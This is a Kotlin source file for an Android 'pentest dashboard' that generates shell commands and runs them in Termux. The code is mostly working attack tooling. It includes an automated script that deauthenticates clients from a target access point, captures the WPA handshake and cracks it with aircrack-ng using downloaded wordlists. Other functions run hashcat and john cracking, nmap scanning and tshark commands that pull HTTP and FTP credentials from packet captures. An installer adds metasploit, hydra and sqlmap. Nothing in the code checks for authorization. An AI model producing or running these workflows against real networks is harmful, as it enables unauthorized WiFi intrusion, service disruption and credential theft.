package com.pentest.dashboard

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.widget.Toast
import java.io.File

/**
 * Termux Integration Manager
 *
 * Executes pentesting tools directly in Termux from the app.
 * Requires Termux:API and proper permissions.
 *
 * Supported Tools:
 * - aircrack-ng (WiFi cracking)
 * - hashcat (hash cracking)
 * - wireshark/tshark (packet analysis)
 * - nmap (network scanning)
 * - john (password cracking)
 * - metasploit (exploitation framework)
 */
class TermuxIntegration(private val context: Context) {

    companion object {
        private const val TERMUX_PACKAGE = "com.termux"
        private const val TERMUX_RUN_COMMAND_ACTION = "com.termux.RUN_COMMAND"
    }

    /**
     * Execute command in Termux
     */
    fun runCommand(
        command: String,
        workDir: String? = null,
        background: Boolean = false
    ): Boolean {
        try {
            val intent = Intent().apply {
                action = TERMUX_RUN_COMMAND_ACTION
                setClassName(TERMUX_PACKAGE, "$TERMUX_PACKAGE.app.RunCommandService")
                putExtra("com.termux.RUN_COMMAND_PATH", "/data/data/com.termux/files/usr/bin/bash")
                putExtra("com.termux.RUN_COMMAND_ARGUMENTS", arrayOf("-c", command))
                workDir?.let { putExtra("com.termux.RUN_COMMAND_WORKDIR", it) }
                putExtra("com.termux.RUN_COMMAND_BACKGROUND", background)
            }
            context.startService(intent)
            return true
        } catch (e: Exception) {
            e.printStackTrace()
            return false
        }
    }

    /**
     * Copy command to clipboard
     */
    fun copyToClipboard(command: String) {
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("Termux Command", command)
        clipboard.setPrimaryClip(clip)
        Toast.makeText(context, "Command copied! Paste in Termux", Toast.LENGTH_SHORT).show()
    }

    /**
     * WiFi Pentesting Tools
     */
    object WiFi {
        /**
         * Start WiFi monitor mode
         */
        fun enableMonitorMode(iface: String = "wlan0"): String {
            return """
                echo "Enabling monitor mode on $iface..."
                sudo airmon-ng check kill
                sudo airmon-ng start $iface
                iwconfig
            """.trimIndent()
        }

        /**
         * Capture WiFi handshake
         */
        fun captureHandshake(
            bssid: String,
            channel: Int,
            outputFile: String = "/sdcard/Download/capture"
        ): String {
            return """
                echo "Capturing handshake for $bssid on channel $channel..."
                sudo airodump-ng --bssid $bssid --channel $channel --write $outputFile wlan0mon
            """.trimIndent()
        }

        /**
         * Deauth attack to force handshake
         */
        fun deauthAttack(
            bssid: String,
            clientMac: String? = null,
            count: Int = 10
        ): String {
            val target = clientMac ?: bssid
            return """
                echo "Sending deauth packets..."
                sudo aireplay-ng --deauth $count -a $bssid ${if (clientMac != null) "-c $clientMac" else ""} wlan0mon
            """.trimIndent()
        }

        /**
         * Crack WiFi password using aircrack-ng with online wordlist
         */
        fun crackWiFi(
            capFile: String,
            useOnlineWordlist: Boolean = true,
            bssid: String? = null
        ): String {
            // Use online wordlists to save storage
            val wordlist = if (useOnlineWordlist) {
                """<(curl -s "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt")"""
            } else {
                "/sdcard/Download/wordlist.txt"
            }

            return """
                echo "Cracking WiFi password..."
                echo "Using ${if (useOnlineWordlist) "online" else "local"} wordlist..."
                ${if (bssid != null) "aircrack-ng -b $bssid -w $wordlist $capFile" else "aircrack-ng -w $wordlist $capFile"}
                echo "If cracked, password will be shown above!"
            """.trimIndent()
        }

        /**
         * Online Wordlist URLs (saves storage!)
         */
        object Wordlists {
            const val TOP_10K = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt"
            const val TOP_100K = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
            const val ROCKYOU = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
            const val COMMON_WIFI = "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/WPA-Length/Top2Billion-WPA-probable.txt"
        }

        /**
         * Complete automated workflow: Capture + Crack
         */
        fun automatedCrack(
            bssid: String,
            channel: Int,
            useOnlineWordlist: Boolean = true
        ): String {
            val wordlist = if (useOnlineWordlist) {
                """<(curl -s "${Wordlists.COMMON_WIFI}")"""
            } else {
                "/sdcard/Download/wordlist.txt"
            }
            return """
                #!/data/data/com.termux/files/usr/bin/bash

                echo "=== AUTOMATED WIFI CRACK ==="
                echo "Target: $bssid"
                echo "Channel: $channel"
                echo ""

                # Enable monitor mode
                echo "[1/5] Enabling monitor mode..."
                sudo airmon-ng check kill
                sudo airmon-ng start wlan0

                # Start capture in background
                echo "[2/5] Starting packet capture..."
                sudo airodump-ng --bssid $bssid --channel $channel --write /sdcard/Download/handshake wlan0mon &
                CAPTURE_PID=${'$'}!
                sleep 5

                # Send deauth packets
                echo "[3/5] Sending deauth to force handshake..."
                sudo aireplay-ng --deauth 20 -a $bssid wlan0mon
                sleep 10

                # Stop capture
                echo "[4/5] Stopping capture..."
                sudo kill ${'$'}CAPTURE_PID

                # Crack the handshake
                echo "[5/5] Cracking password..."
                aircrack-ng -w $wordlist /sdcard/Download/handshake-01.cap

                echo ""
                echo "=== DONE ==="
                echo "Check output above for cracked password!"
            """.trimIndent()
        }
    }

    /**
     * Hash Cracking Tools
     */
    object Hash {
        /**
         * Crack hash with hashcat
         */
        fun crackHash(
            hashFile: String,
            hashType: Int,
            wordlist: String,
            rules: String? = null
        ): String {
            val rulesArg = if (rules != null) "-r $rules" else ""
            return """
                echo "Cracking hashes with hashcat..."
                echo "Hash type: $hashType"
                hashcat -m $hashType $hashFile $wordlist $rulesArg --force
            """.trimIndent()
        }

        /**
         * Crack with john the ripper
         */
        fun johnCrack(hashFile: String, wordlist: String? = null): String {
            val wordlistArg = if (wordlist != null) "--wordlist=$wordlist" else ""
            return """
                echo "Cracking with John the Ripper..."
                john $wordlistArg $hashFile
                echo ""
                echo "Showing cracked passwords:"
                john --show $hashFile
            """.trimIndent()
        }
    }

    /**
     * Network Analysis Tools
     */
    object Network {
        /**
         * Nmap scan
         */
        fun nmapScan(target: String, scanType: String = "-sV"): String {
            return """
                echo "Scanning $target..."
                nmap $scanType $target
            """.trimIndent()
        }

        /**
         * Analyze pcap file with tshark
         */
        fun analyzePcap(pcapFile: String): String {
            return """
                echo "Analyzing packet capture..."
                tshark -r $pcapFile -q -z conv,ip
                echo ""
                echo "HTTP requests:"
                tshark -r $pcapFile -Y "http.request" -T fields -e http.host -e http.request.uri
            """.trimIndent()
        }

        /**
         * Extract credentials from pcap
         */
        fun extractCreds(pcapFile: String): String {
            return """
                echo "Extracting credentials from capture..."
                tshark -r $pcapFile -Y "http.request.method == POST" -T fields -e http.file_data | grep -i "user\|pass\|login"
                echo ""
                echo "FTP credentials:"
                tshark -r $pcapFile -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
            """.trimIndent()
        }
    }

    /**
     * Setup and Installation
     */
    object Setup {
        /**
         * Install all required pentesting tools
         */
        fun installTools(): String {
            return """
                #!/data/data/com.termux/files/usr/bin/bash

                echo "=== INSTALLING PENTESTING TOOLS ==="
                echo ""

                # Update package list
                echo "[1/10] Updating packages..."
                pkg update -y && pkg upgrade -y

                # Install basic tools
                echo "[2/10] Installing basic tools..."
                pkg install -y root-repo x11-repo

                # Install wireless tools
                echo "[3/10] Installing aircrack-ng suite..."
                pkg install -y aircrack-ng

                # Install hashcat
                echo "[4/10] Installing hashcat..."
                pkg install -y hashcat

                # Install john
                echo "[5/10] Installing john the ripper..."
                pkg install -y john

                # Install nmap
                echo "[6/10] Installing nmap..."
                pkg install -y nmap

                # Install wireshark/tshark
                echo "[7/10] Installing tshark..."
                pkg install -y tshark

                # Install metasploit
                echo "[8/10] Installing metasploit (this may take a while)..."
                pkg install -y unstable-repo
                pkg install -y metasploit

                # Install other useful tools
                echo "[9/10] Installing additional tools..."
                pkg install -y hydra sqlmap nikto dirb wordlists

                # Download wordlists
                echo "[10/10] Downloading wordlists..."
                mkdir -p ~/wordlists
                cd ~/wordlists
                wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -O top1m.txt

                echo ""
                echo "=== INSTALLATION COMPLETE ==="
                echo "All tools installed successfully!"
            """.trimIndent()
        }

        /**
         * Check if tools are installed
         */
        fun checkTools(): String {
            return """
                echo "Checking installed tools..."
                echo ""

                command -v aircrack-ng && echo "✓ aircrack-ng" || echo "✗ aircrack-ng (missing)"
                command -v hashcat && echo "✓ hashcat" || echo "✗ hashcat (missing)"
                command -v john && echo "✓ john" || echo "✗ john (missing)"
                command -v nmap && echo "✓ nmap" || echo "✗ nmap (missing)"
                command -v tshark && echo "✓ tshark" || echo "✗ tshark (missing)"
                command -v msfconsole && echo "✓ metasploit" || echo "✗ metasploit (missing)"
            """.trimIndent()
        }
    }
}
